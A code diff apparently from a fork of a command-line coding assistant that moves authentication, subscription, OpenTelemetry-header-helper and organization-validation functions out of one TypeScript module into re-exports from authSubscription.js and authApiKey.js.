-const DEFAULT_OTEL_HEADERS_DEBOUNCE_MS = 29 * 60 * 1000 // 29 minutes
-
-export function getOtelHeadersFromHelper(): Record<string, string> {
-  const otelHeadersHelper = getConfiguredOtelHeadersHelper()
-
-  if (!otelHeadersHelper) {
-    return {}
-  }
-
-  // Return cached headers if still valid (debounce)
-  const debounceMs = parseInt(
-    process.env.CLAUDE_CODE_OTEL_HEADERS_HELPER_DEBOUNCE_MS ||
-      DEFAULT_OTEL_HEADERS_DEBOUNCE_MS.toString(),
-  )
-  if (
-    cachedOtelHeaders &&
-    Date.now() - cachedOtelHeadersTimestamp < debounceMs
-  ) {
-    return cachedOtelHeaders
-  }
-
-  if (isOtelHeadersHelperFromProjectOrLocalSettings()) {
-    // Check if trust has been established for this project
-    const hasTrust = checkHasTrustDialogAccepted()
-    if (!hasTrust) {
-      return {}
-    }
-  }
-
-  try {
-    const result = execSyncWithDefaults_DEPRECATED(otelHeadersHelper, {
-      timeout: 30000, // 30 seconds - allows for auth service latency
-    })
-      ?.toString()
-      .trim()
-    if (!result) {
-      throw new Error('otelHeadersHelper did not return a valid value')
-    }
-
-    const headers = jsonParse(result)
-    if (
-      typeof headers !== 'object' ||
-      headers === null ||
-      Array.isArray(headers)
-    ) {
-      throw new Error(
-        'otelHeadersHelper must return a JSON object with string key-value pairs',
-      )
-    }
-
-    // Validate all values are strings
-    for (const [key, value] of Object.entries(headers)) {
-      if (typeof value !== 'string') {
-        throw new Error(
-          `otelHeadersHelper returned non-string value for key "${key}": ${typeof value}`,
-        )
-      }
-    }
-
-    // Cache the result
-    cachedOtelHeaders = headers as Record<string, string>
-    cachedOtelHeadersTimestamp = Date.now()
-
-    return cachedOtelHeaders
-  } catch (error) {
-    logError(
-      new Error(
-        `Error getting OpenTelemetry headers from otelHeadersHelper (in settings): ${errorMessage(error)}`,
-      ),
-    )
-    throw error
-  }
-}
-
-function isConsumerPlan(plan: SubscriptionType): plan is 'max' | 'pro' {
-  return plan === 'max' || plan === 'pro'
-}
-
-export function isConsumerSubscriber(): boolean {
-  const subscriptionType = getSubscriptionType()
-  return (
-    isClaudeAISubscriber() &&
-    subscriptionType !== null &&
-    isConsumerPlan(subscriptionType)
-  )
-}
-
-export type UserAccountInfo = {
-  subscription?: string
-  tokenSource?: string
-  apiKeySource?: ApiKeySource
-  organization?: string
-  email?: string
-}
-
-export function getAccountInformation() {
-  const apiProvider = getAPIProvider()
-  // Only provide account info for first-party Anthropic API
-  if (apiProvider !== 'firstParty') {
-    return undefined
-  }
-  const { source: authTokenSource } = getAuthTokenSource()
-  const accountInfo: UserAccountInfo = {}
-  if (
-    authTokenSource === 'CLAUDE_CODE_OAUTH_TOKEN' ||
-    authTokenSource === 'CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR'
-  ) {
-    accountInfo.tokenSource = authTokenSource
-  } else if (isClaudeAISubscriber()) {
-    accountInfo.subscription = getSubscriptionName()
-  } else {
-    accountInfo.tokenSource = authTokenSource
-  }
-  const { key: apiKey, source: apiKeySource } = getAnthropicApiKeyWithSource()
-  if (apiKey) {
-    accountInfo.apiKeySource = apiKeySource
-  }
-
-  // We don't know the organization if we're relying on an external API key or auth token
-  if (
-    authTokenSource === 'claude.ai' ||
-    apiKeySource === '/login managed key'
-  ) {
-    // Get organization name from OAuth account info
-    const orgName = getOauthAccountInfo()?.organizationName
-    if (orgName) {
-      accountInfo.organization = orgName
-    }
-  }
-  const email = getOauthAccountInfo()?.emailAddress
-  if (
-    (authTokenSource === 'claude.ai' ||
-      apiKeySource === '/login managed key') &&
-    email
-  ) {
-    accountInfo.email = email
-  }
-  return accountInfo
-}
-
-/**
- * Result of org validation — either success or a descriptive error.
- */
-export type OrgValidationResult =
-  | { valid: true }
-  | { valid: false; message: string }
-
-/**
- * Validate that the active OAuth token belongs to the organization required
- * by `forceLoginOrgUUID` in managed settings. Returns a result object
- * rather than throwing so callers can choose how to surface the error.
- *
- * Fails closed: if `forceLoginOrgUUID` is set and we cannot determine the
- * token's org (network error, missing profile data), validation fails.
- */
-export async function validateForceLoginOrg(): Promise<OrgValidationResult> {
-  // `claude ssh` remote: real auth lives on the local machine and is injected
-  // by the proxy. The placeholder token can't be validated against the profile
-  // endpoint. The local side already ran this check before establishing the session.
-  if (process.env.ANTHROPIC_UNIX_SOCKET) {
-    return { valid: true }
-  }
-
-  if (!isAnthropicAuthEnabled()) {
-    return { valid: true }
-  }
-
-  const requiredOrgUuid =
-    getSettingsForSource('policySettings')?.forceLoginOrgUUID
-  if (!requiredOrgUuid) {
-    return { valid: true }
-  }
-
-  // Ensure the access token is fresh before hitting the profile endpoint.
-  // No-op for env-var tokens (refreshToken is null).
-  await checkAndRefreshOAuthTokenIfNeeded()
-
-  const tokens = getClaudeAIOAuthTokens()
-  if (!tokens) {
-    return { valid: true }
-  }
-
-  // Always fetch the authoritative org UUID from the profile endpoint.
-  // Even keychain-sourced tokens verify server-side: the cached org UUID
-  // in ~/.freecc.json is user-writable and cannot be trusted.
-  const { source } = getAuthTokenSource()
-  const isEnvVarToken =
-    source === 'CLAUDE_CODE_OAUTH_TOKEN' ||
-    source === 'CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR'
-
-  const profile = await getOauthProfileFromOauthToken(tokens.accessToken)
-  if (!profile) {
-    // Fail closed — we can't verify the org
-    return {
-      valid: false,
-      message:
-        `Unable to verify organization for the current authentication token.\n` +
-        `This machine requires organization ${requiredOrgUuid} but the profile could not be fetched.\n` +
-        `This may be a network error, or the token may lack the user:profile scope required for\n` +
-        `verification (tokens from 'claude setup-token' do not include this scope).\n` +
-        `Try again, or obtain a full-scope token via 'claude auth login'.`,
-    }
-  }
-
-  const tokenOrgUuid = profile.organization.uuid
-  if (tokenOrgUuid === requiredOrgUuid) {
-    return { valid: true }
-  }
-
-  if (isEnvVarToken) {
-    const envVarName =
-      source === 'CLAUDE_CODE_OAUTH_TOKEN'
-        ? 'CLAUDE_CODE_OAUTH_TOKEN'
-        : 'CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR'
-    return {
-      valid: false,
-      message:
-        `The ${envVarName} environment variable provides a token for a\n` +
-        `different organization than required by this machine's managed settings.\n\n` +
-        `Required organization: ${requiredOrgUuid}\n` +
-        `Token organization:   ${tokenOrgUuid}\n\n` +
-        `Remove the environment variable or obtain a token for the correct organization.`,
-    }
-  }
-
-  return {
-    valid: false,
-    message:
-      `Your authentication token belongs to organization ${tokenOrgUuid},\n` +
-      `but this machine requires organization ${requiredOrgUuid}.\n\n` +
-      `Please log in with the correct organization: claude auth login`,
-  }
-}
-
-// Re-export OAuth helpers (originally imported with underscore prefix above).
-// Done at the bottom because TypeScript loses the re-export when the same
-// name is used both as a re-export target and as an internal alias.
+// OAuth token storage / refresh
 export {
   _saveOAuthTokensIfNeeded as saveOAuthTokensIfNeeded,
   _clearOAuthTokenCache as clearOAuthTokenCache,
@@ -1231,3 +180,55 @@ export {
   _clearCodexOAuthTokens as clearCodexOAuthTokens,
   _handleOAuth401Error as handleOAuth401Error,
 }
+
+// Auth token source detection
+export {
+  _isAnthropicAuthEnabled as isAnthropicAuthEnabled,
+  _getAuthTokenSource as getAuthTokenSource,
+  _getAnthropicApiKey as getAnthropicApiKey,
+  _hasAnthropicApiKeyAuth as hasAnthropicApiKeyAuth,
+  _getAnthropicApiKeyWithSource as getAnthropicApiKeyWithSource,
+  _getConfiguredApiKeyHelper as getConfiguredApiKeyHelper,
+  _calculateApiKeyHelperTTL as calculateApiKeyHelperTTL,
+  _getApiKeyHelperElapsedMs as getApiKeyHelperElapsedMs,
+  _getApiKeyFromApiKeyHelper as getApiKeyFromApiKeyHelper,
+  _getApiKeyFromApiKeyHelperCached as getApiKeyFromApiKeyHelperCached,
+  _clearApiKeyHelperCache as clearApiKeyHelperCache,
+  _prefetchApiKeyFromApiKeyHelperIfSafe as prefetchApiKeyFromApiKeyHelperIfSafe,
+  _getApiKeyFromConfigOrMacOSKeychain as getApiKeyFromConfigOrMacOSKeychain,
+}
+
+// API key storage
+export {
+  saveApiKey,
+  removeApiKey,
+  isCustomApiKeyApproved,
+} from './authApiKey.js'
+
+// Subscription / account / org-validation helpers
+export {
+  isClaudeAISubscriber,
+  isCodexSubscriber,
+  isOpenRouterUser,
+  isAnthropicCompatUser,
+  hasProfileScope,
+  is1PApiCustomer,
+  getOauthAccountInfo,
+  isOverageProvisioningAllowed,
+  hasOpusAccess,
+  getSubscriptionType,
+  isMaxSubscriber,
+  isTeamSubscriber,
+  isTeamPremiumSubscriber,
+  isEnterpriseSubscriber,
+  isProSubscriber,
+  getRateLimitTier,
+  getSubscriptionName,
+  isUsing3PServices,
+  isOtelHeadersHelperFromProjectOrLocalSettings,
+  getOtelHeadersFromHelper,
+  isConsumerSubscriber,
+  getAccountInformation,
+  validateForceLoginOrg,
+} from './authSubscription.js'
+export type { UserAccountInfo, OrgValidationResult } from './authSubscription.js'
